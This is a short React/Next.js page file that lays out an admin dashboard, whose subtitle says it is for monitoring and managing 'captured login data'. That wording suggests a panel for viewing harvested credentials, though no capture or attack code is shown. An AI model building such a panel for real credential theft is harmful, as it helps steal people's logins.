import { AdminDashboard } from "@/components/admin-dashboard"
import { Header } from "@/components/header"

export default function AdminPage() {
  return (
    <div className="min-h-screen bg-gray-50">
      <Header />

      <div className="py-8">
        <div className="max-w-7xl mx-auto px-4">
          <div className="mb-8">
            <h1 className="text-3xl font-bold text-gray-900">Admin Dashboard</h1>
            <p className="text-gray-600 mt-2">Monitor and manage captured login data</p>
          </div>

          <AdminDashboard />
        </div>
      </div>
    </div>
  )
}
